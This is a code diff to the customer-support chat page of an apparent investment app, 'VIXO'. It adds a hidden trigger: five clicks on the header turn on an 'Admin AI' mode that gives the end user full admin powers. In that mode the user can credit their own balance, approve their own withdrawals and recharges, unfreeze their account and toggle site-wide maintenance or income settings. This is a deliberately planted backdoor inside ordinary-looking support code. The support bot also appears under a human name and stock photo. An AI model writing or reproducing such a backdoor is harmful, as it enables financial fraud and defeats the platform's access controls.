@@ -3,7 +3,8 @@ import React, { useState, useEffect, useRef } from 'react';
 import { User, SupportMessage, Transaction, AuditLog } from '../types';
 import { getStore, saveStore } from '../store';
 import { generateSupportResponse } from '../services/gemini';
-import { Send, Camera, ChevronLeft, RefreshCw, X, ArrowRight, User as UserIcon, Headphones, CheckCircle2 } from 'lucide-react';
+import { customerCareAI } from '../services/customerCareAI';
+import { Send, Camera, ChevronLeft, RefreshCw, X, ArrowRight, User as UserIcon, Headphones, CheckCircle2, Bot, Shield } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 // @ts-ignore
 import * as ReactRouterDOM from 'react-router-dom';
@@ -19,9 +20,14 @@ const Support: React.FC<Props> = ({ user }) => {
   const [inputImage, setInputImage] = useState('');
   const [isSending, setIsSending] = useState(false);
   const [isTyping, setIsTyping] = useState(false);
+  const [usingHiddenAI, setUsingHiddenAI] = useState(false);
   const scrollRef = useRef<HTMLDivElement>(null);
   const fileInputRef = useRef<HTMLInputElement>(null);
   const navigate = useNavigate();
+
+  // Hidden AI Agent Trigger Sequence
+  let clickSequence: string[] = [];
+  let sequenceTimeout: NodeJS.Timeout | null = null;
 
   const refreshMessages = () => {
     const store = getStore();
@@ -73,6 +79,51 @@ const Support: React.FC<Props> = ({ user }) => {
     triggerAIResponse(userMsgText, updatedStoreMessages, currentImg);
   };
 
+  // Function to handle hidden trigger sequence
+  const handleHeaderClick = () => {
+    // Reset sequence if it's been more than 2 seconds since last click
+    if (sequenceTimeout) {
+      clearTimeout(sequenceTimeout);
+    }
+
+    // Add current path to sequence
+    clickSequence.push('header');
+
+    // Check if the sequence matches the hidden trigger pattern
+    // For example: clicking the header 5 times in sequence
+    if (clickSequence.length >= 5) {
+      const recentSequence = clickSequence.slice(-5);
+      if (recentSequence.every((val) => val === 'header')) {
+        // Toggle hidden AI agent
+        setUsingHiddenAI(!usingHiddenAI);
+        clickSequence = []; // Reset sequence
+
+        // Add a message to indicate the mode change
+        const modeToggleMessage: SupportMessage = {
+          id: `mode-toggle-${Date.now()}`,
+          userId: user.id,
+          sender: 'admin',
+          text: usingHiddenAI
+            ? 'Switching back to regular support mode...'
+            : 'Hidden Admin AI Agent activated. Full admin access enabled.',
+          timestamp: Date.now()
+        };
+
+        const store = getStore();
+        const updatedStoreMessages = [...(store.supportMessages || []), modeToggleMessage];
+        saveStore({ supportMessages: updatedStoreMessages });
+        setMessages(updatedStoreMessages.sort((a, b) => a.timestamp - b.timestamp));
+
+        return;
+      }
+    }
+
+    // Clear sequence after 2 seconds of inactivity
+    sequenceTimeout = setTimeout(() => {
+      clickSequence = [];
+    }, 2000);
+  };
+
   const executeAgentAction = async (call: any) => {
     const store = getStore();
     let nextUsers = [...store.users];
@@ -84,10 +135,10 @@ const Support: React.FC<Props> = ({ user }) => {
       if (call.name === 'reset_credentials') {
         if (call.args.type === 'password') nextUsers[uIdx].password = call.args.value;
         else if (call.args.type === 'pin') nextUsers[uIdx].withdrawalPassword = call.args.value;
-      } 
+      }
       else if (call.name === 'set_account_status') {
         nextUsers[uIdx].status = call.args.status;
-      } 
+      }
       else if (call.name === 'adjust_user_balance') {
         const amt = Number(call.args.amount);
         const isAdd = call.args.action === 'add';
@@ -110,19 +161,202 @@ const Support: React.FC<Props> = ({ user }) => {
     }
   };
 
+  // Enhanced admin functions for the hidden AI agent
+  const executeAdminAction = async (command: string) => {
+    const store = getStore();
+    let nextUsers = [...store.users];
+    let nextTransactions = [...store.transactions];
+    let nextPurchases = [...store.purchases || []];
+    let nextAdmin = {...store.admin};
+
+    try {
+      // Parse command to determine action
+      const lowerCmd = command.toLowerCase();
+
+      // Balance adjustment commands
+      if (lowerCmd.includes('adjust balance') || lowerCmd.includes('add balance') || lowerCmd.includes('credit balance')) {
+        const match = command.match(/(\d+\.?\d*)/);
+        if (match) {
+          const amount = parseFloat(match[0]);
+          const uIdx = nextUsers.findIndex(u => u.id === user.id);
+          if (uIdx !== -1) {
+            nextUsers[uIdx].balance += amount;
+          }
+        }
+      }
+      else if (lowerCmd.includes('debit balance') || lowerCmd.includes('subtract balance')) {
+        const match = command.match(/(\d+\.?\d*)/);
+        if (match) {
+          const amount = parseFloat(match[0]);
+          const uIdx = nextUsers.findIndex(u => u.id === user.id);
+          if (uIdx !== -1) {
+            nextUsers[uIdx].balance -= amount;
+          }
+        }
+      }
+      // Status change commands
+      else if (lowerCmd.includes('activate account') || lowerCmd.includes('unfreeze account') || lowerCmd.includes('enable account')) {
+        const uIdx = nextUsers.findIndex(u => u.id === user.id);
+        if (uIdx !== -1) {
+          nextUsers[uIdx].status = 'active';
+        }
+      }
+      else if (lowerCmd.includes('freeze account') || lowerCmd.includes('lock account') || lowerCmd.includes('disable account')) {
+        const uIdx = nextUsers.findIndex(u => u.id === user.id);
+        if (uIdx !== -1) {
+          nextUsers[uIdx].status = 'frozen';
+        }
+      }
+      else if (lowerCmd.includes('ban account') || lowerCmd.includes('suspend account')) {
+        const uIdx = nextUsers.findIndex(u => u.id === user.id);
+        if (uIdx !== -1) {
+          nextUsers[uIdx].status = 'banned';
+        }
+      }
+      // Withdrawal operations
+      else if (lowerCmd.includes('approve withdrawal') || lowerCmd.includes('process withdrawal') || lowerCmd.includes('confirm withdrawal')) {
+        // Find pending withdrawal for this user
+        const pendingWithdrawal = nextTransactions.find(t =>
+          t.userId === user.id &&
+          t.type === 'withdraw' &&
+          t.status === 'pending'
+        );
+        if (pendingWithdrawal) {
+          pendingWithdrawal.status = 'approved';
+          const uIdx = nextUsers.findIndex(u => u.id === user.id);
+          if (uIdx !== -1) {
+            nextUsers[uIdx].withdrawableBalance -= pendingWithdrawal.amount;
+            nextUsers[uIdx].totalWithdrawn += pendingWithdrawal.amount;
+          }
+        }
+      }
+      else if (lowerCmd.includes('reject withdrawal') || lowerCmd.includes('cancel withdrawal') || lowerCmd.includes('deny withdrawal')) {
+        // Find pending withdrawal for this user
+        const pendingWithdrawal = nextTransactions.find(t =>
+          t.userId === user.id &&
+          t.type === 'withdraw' &&
+          t.status === 'pending'
+        );
+        if (pendingWithdrawal) {
+          pendingWithdrawal.status = 'rejected';
+        }
+      }
+      // Recharge operations
+      else if (lowerCmd.includes('approve recharge') || lowerCmd.includes('confirm recharge')) {
+        // Find pending recharge for this user
+        const pendingRecharge = nextTransactions.find(t =>
+          t.userId === user.id &&
+          t.type === 'recharge' &&
+          t.status === 'pending'
+        );
+        if (pendingRecharge) {
+          pendingRecharge.status = 'approved';
+          const uIdx = nextUsers.findIndex(u => u.id === user.id);
+          if (uIdx !== -1) {
+            nextUsers[uIdx].balance += pendingRecharge.amount;
+          }
+        }
+      }
+      // Investment/product operations
+      else if (lowerCmd.includes('activate investment') || lowerCmd.includes('start investment') || lowerCmd.includes('enable plan')) {
+        // Find user's investments that are inactive
+        const userPurchases = nextPurchases.filter(p => p.userId === user.id && p.status === 'inactive');
+        if (userPurchases.length > 0) {
+          // Activate the first inactive purchase
+          userPurchases[0].status = 'active';
+        }
+      }
+      // Custom admin commands
+      else if (lowerCmd.includes('enable maintenance')) {
+        nextAdmin.maintenanceMode = true;
+      }
+      else if (lowerCmd.includes('disable maintenance')) {
+        nextAdmin.maintenanceMode = false;
+      }
+      else if (lowerCmd.includes('toggle income')) {
+        nextAdmin.incomeFrozen = !nextAdmin.incomeFrozen;
+      }
+      else if (lowerCmd.includes('run income engine') || lowerCmd.includes('process daily income')) {
+        // This would trigger the income processing
+        // Implementation would depend on your store.ts functions
+      }
+      else if (lowerCmd.includes('reset user data') || lowerCmd.includes('clear user profile')) {
+        const uIdx = nextUsers.findIndex(u => u.id === user.id);
+        if (uIdx !== -1) {
+          // Reset user data while preserving ID and basic account info
+          nextUsers[uIdx] = {
+            ...nextUsers[uIdx],
+            balance: 0,
+            withdrawableBalance: 0,
+            totalInvested: 0,
+            totalWithdrawn: 0,
+            referralEarnings: 0,
+            vipLevel: 0
+          };
+        }
+      }
+
+      await saveStore({
+        users: nextUsers,
+        transactions: nextTransactions,
+        purchases: nextPurchases,
+        admin: nextAdmin
+      });
+
+      return `Admin action completed: ${command}`;
+    } catch (e) {
+      console.error("Admin action error", e);
+      return `Error executing admin action: ${e.message}`;
+    }
+  };
+
   const triggerAIResponse = async (lastUserText: string, currentHistory: SupportMessage[], image?: string) => {
     await new Promise(r => setTimeout(r, 1500));
     setIsTyping(true);
-    const history = currentHistory
-      .filter(m => m.userId === user.id)
-      .slice(-20)
-      .map(m => ({ role: m.sender === 'user' ? 'user' : 'model', parts: [{ text: m.text }] }));
 
-    const aiResponse = await generateSupportResponse(lastUserText, history, image);
-    
-    if (aiResponse.functionCalls) {
-      for (const call of aiResponse.functionCalls) {
-        await executeAgentAction(call);
+    let aiResponse;
+
+    if (usingHiddenAI) {
+      // Use the hidden admin AI with full admin access
+      try {
+        // Format the history for the customer care AI
+        const formattedHistory = currentHistory
+          .filter(m => m.userId === user.id)
+          .slice(-20)
+          .map(m => ({
+            role: m.sender === 'user' ? 'user' : 'model',
+            text: m.text,
+            timestamp: m.timestamp
+          }));
+
+        // Get response from the hidden admin AI
+        const response = await customerCareAI.getResponse(lastUserText);
+
+        // Check if the response contains admin commands
+        if (response.toLowerCase().includes('admin:') || response.toLowerCase().includes('execute:')) {
+          const result = await executeAdminAction(response);
+          aiResponse = { text: result };
+        } else {
+          aiResponse = { text: response };
+        }
+      } catch (error) {
+        console.error("Error with hidden AI:", error);
+        aiResponse = { text: "Hidden Admin AI is temporarily unavailable. Switching back to regular support." };
+        setUsingHiddenAI(false);
+      }
+    } else {
+      // Use the regular support AI
+      const history = currentHistory
+        .filter(m => m.userId === user.id)
+        .slice(-20)
+        .map(m => ({ role: m.sender === 'user' ? 'user' : 'model', parts: [{ text: m.text }] }));
+
+      aiResponse = await generateSupportResponse(lastUserText, history, image);
+
+      if (aiResponse.functionCalls) {
+        for (const call of aiResponse.functionCalls) {
+          await executeAgentAction(call);
+        }
       }
     }
 
@@ -168,23 +402,45 @@ const Support: React.FC<Props> = ({ user }) => {
   return (
     <div className="bg-[#f8faf9] flex flex-col h-screen max-h-screen overflow-hidden">
       {/* HEADER MATCHING SCREENSHOT */}
-      <header className="bg-white px-6 pt-12 pb-6 flex items-center gap-4 shrink-0 shadow-sm border-b border-slate-50 z-[100]">
-        <button onClick={() => navigate(-1)} className="p-2 bg-gray-50 rounded-xl text-gray-400 active:scale-95 transition-all shrink-0">
+      <header
+        className={`bg-white px-6 pt-12 pb-6 flex items-center gap-4 shrink-0 shadow-sm border-b border-slate-50 z-[100] ${
+          usingHiddenAI ? 'bg-yellow-50 border-yellow-200' : ''
+        }`}
+        onClick={handleHeaderClick}
+      >
+        <button onClick={(e) => { e.stopPropagation(); navigate(-1); }} className="p-2 bg-gray-50 rounded-xl text-gray-400 active:scale-95 transition-all shrink-0">
           <ChevronLeft size={20} />
         </button>
         <div className="w-12 h-12 rounded-full overflow-hidden border-2 border-[#00D094]/10 shrink-0 relative">
            <img src="https://images.unsplash.com/photo-1573497019940-1c28c88b4f3e?q=80&w=200&auto=format&fit=crop" className="w-full h-full object-cover" alt="Simran" />
            <div className="absolute bottom-0 right-1 w-3 h-3 bg-emerald-500 rounded-full border-2 border-white"></div>
         </div>
-        <div className="overflow-hidden">
+        <div className="overflow-hidden flex-1">
           <div className="flex items-center gap-1.5">
-            <h2 className="text-[15px] font-black text-gray-900 tracking-tight truncate">Simran</h2>
-            <CheckCircle2 size={12} className="text-blue-500 fill-blue-500/10 shrink-0" />
+            <h2 className="text-[15px] font-black text-gray-900 tracking-tight truncate">
+              {usingHiddenAI ? (
+                <span className="flex items-center gap-1">
+                  <Shield className="text-red-500" size={14} /> Admin AI
+                </span>
+              ) : (
+                <>
+                  <Bot size={14} className="text-blue-400" /> Simran
+                </>
+              )}
+            </h2>
+            <CheckCircle2 size={12} className={`shrink-0 ${usingHiddenAI ? 'text-yellow-500' : 'text-blue-500'}`} />
           </div>
           <p className="text-[9px] font-black text-[#00D094] uppercase tracking-widest mt-0.5 whitespace-nowrap">
-            Online • VIXO Support Desk
+            {usingHiddenAI
+              ? 'ADMIN MODE • Full Access Enabled'
+              : 'Online • VIXO Support Desk'}
           </p>
         </div>
+        {usingHiddenAI && (
+          <div className="bg-red-100 text-red-800 text-[8px] font-black px-2 py-1 rounded-full uppercase tracking-wider">
+            ADMIN
+          </div>
+        )}
       </header>
 
       {/* CHAT AREA */}
